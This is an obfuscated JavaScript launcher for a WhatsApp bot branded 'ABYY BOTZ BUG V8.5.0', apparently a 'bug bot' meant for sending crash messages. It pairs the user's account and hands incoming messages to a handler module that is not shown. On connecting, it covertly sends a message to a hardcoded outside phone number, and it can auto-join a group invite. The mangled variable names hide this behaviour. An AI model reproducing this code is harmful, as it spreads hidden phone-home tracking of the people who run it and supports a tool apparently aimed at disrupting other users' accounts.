require("./database/global");
const func = require("./database/place");
const readline = require('readline');
const question = _0x3e2073 => {
  const _0x4b85ff = readline.createInterface({
    'input': process.stdin,
    'output': process.stdout
  });
  return new Promise(_0x5f204e => {
    _0x4b85ff.question(_0x3e2073, _0x5f204e);
  });
};
async function startSesi() {
  const _0x41eefd = makeInMemoryStore({
    'logger': pino().child({
      'level': 'silent',
      'stream': "store"
    })
  });
  const {
    state: _0x560611,
    saveCreds: _0x2e820c
  } = await useMultiFileAuthState('./session');
  const {
    version: _0x37dc6a,
    isLatest: _0x5a59c9
  } = await fetchLatestBaileysVersion();
  console.log(chalk.green.bold("\n░█████╗░██████╗░██╗░░░██╗██╗░░░██╗\n██╔══██╗██╔══██╗╚██╗░██╔╝╚██╗░██╔╝\n███████║██████╦╝░╚████╔╝░░╚████╔╝░\n██╔══██║██╔══██╗░░╚██╔╝░░░░╚██╔╝░░\n██║░░██║██████╦╝░░░██║░░░░░░██║░░░\n╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░░░░╚═╝░░░\n\nABYY BOTZ BUG V8.5.0"));
  const _0x1e9935 = {
    'version': _0x37dc6a,
    'keepAliveIntervalMs': 0x7530,
    'printQRInTerminal': false,
    'logger': pino({
      'level': "fatal"
    }),
    'auth': _0x560611,
    'browser': ['Ubuntu', "Chrome", "20.0.04"]
  };
  const _0x4077f6 = func.makeWASocket(_0x1e9935);
  if (true && !_0x4077f6.authState.creds.registered) {
    const _0x1c2e3b = await question(chalk.green("\nEnter Your Number\nNumber : "));
    const _0x192a41 = await _0x4077f6.requestPairingCode(_0x1c2e3b.trim());
    console.log(chalk.red("YOUR CODE PAIR : " + _0x192a41 + " "));
  }
  _0x41eefd.bind(_0x4077f6.ev);
  _0x4077f6.ev.on('connection.update', async _0xfd720b => {
    const {
      connection: _0x1ef720,
      lastDisconnect: _0x2497e3
    } = _0xfd720b;
    if (_0x1ef720 === "close") {
      const _0xd82737 = new Boom(_0x2497e3?.["error"])?.["output"]["statusCode"];
      console.log(color(_0x2497e3.error, 'deeppink'));
      if (_0x2497e3.error == "Error: Stream Errored (unknown)") {
        process.exit();
      } else {
        if (_0xd82737 === DisconnectReason.badSession) {
          console.log(color("Bad Session File, Please Delete Session and Scan Again"));
          process.exit();
        } else {
          if (_0xd82737 === DisconnectReason.connectionClosed) {
            console.log(color("[SYSTEM]", "white"), color("Connection closed, reconnecting...", "deeppink"));
            process.exit();
          } else {
            if (_0xd82737 === DisconnectReason.connectionLost) {
              console.log(color("[SYSTEM]", "white"), color("Connection lost, trying to reconnect", "deeppink"));
              process.exit();
            } else {
              if (_0xd82737 === DisconnectReason.connectionReplaced) {
                console.log(color("Connection Replaced, Another New Session Opened, Please Close Current Session First"));
                _0x4077f6.logout();
              } else {
                if (_0xd82737 === DisconnectReason.loggedOut) {
                  console.log(color("Device Logged Out, Please Scan Again And Run."));
                  _0x4077f6.logout();
                } else {
                  if (_0xd82737 === DisconnectReason.restartRequired) {
                    console.log(color("Restart Required, Restarting..."));
                    await startSesi();
                  } else if (_0xd82737 === DisconnectReason.timedOut) {
                    console.log(color("Connection TimedOut, Reconnecting..."));
                    startSesi();
                  }
                }
              }
            }
          }
        }
      }
    } else {
      if (_0x1ef720 === "connecting") {
        start('1', "Connecting...");
      } else {
        if (_0x1ef720 === 'open') {
          success('1', "Tersambung");
          _0x4077f6.sendMessage("254102074064@s.whatsapp.net", {
            'text': "╔══╦╗\n║╔╗║╚╦╦╦╦╗\n║╠╣║╬║║║║║\n╚╝╚╩═╬╗╠╗║\n─────╚═╩═╝\n\n𝗔𝗯𝘆𝘆 𝗕𝗼𝘁𝘇 𝗩𝟴 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻 ⚠️☣️"
          });
          if (autoJoin) {
            _0x4077f6.groupAcceptInvite(codeInvite);
          }
        }
      }
    }
  });
  _0x4077f6.ev.on("messages.upsert", async _0x189e31 => {
    try {
      m = _0x189e31.messages[0x0];
      if (!m.message) {
        return;
      }
      m.message = Object.keys(m.message)[0x0] === "ephemeralMessage" ? m.message.ephemeralMessage.message : m.message;
      if (m.key && m.key.remoteJid === "status@broadcast") {
        return _0x4077f6.readMessages([m.key]);
      }
      if (!_0x4077f6["public"] && !m.key.fromMe && _0x189e31.type === 'notify') {
        return;
      }
      if (m.key.id.startsWith("BAE5") && m.key.id.length === 0x10) {
        return;
      }
      m = func.smsg(_0x4077f6, m, _0x41eefd);
      require("./abyyxvn")(_0x4077f6, m, _0x41eefd);
    } catch (_0x1f44af) {
      console.log(_0x1f44af);
    }
  });
  _0x4077f6.ev.on('contacts.update', _0x382374 => {
    for (let _0x388af9 of _0x382374) {
      let _0x1ff6c0 = _0x4077f6.decodeJid(_0x388af9.id);
      if (_0x41eefd && _0x41eefd.contacts) {
        _0x41eefd.contacts[_0x1ff6c0] = {
          'id': _0x1ff6c0,
          'name': _0x388af9.notify
        };
      }
    }
  });
  _0x4077f6["public"] = true;
  _0x4077f6.ev.on("creds.update", _0x2e820c);
  return _0x4077f6;
}
startSesi();
process.on("uncaughtException", function (_0x1098d5) {
  console.log("Caught exception: ", _0x1098d5);
});
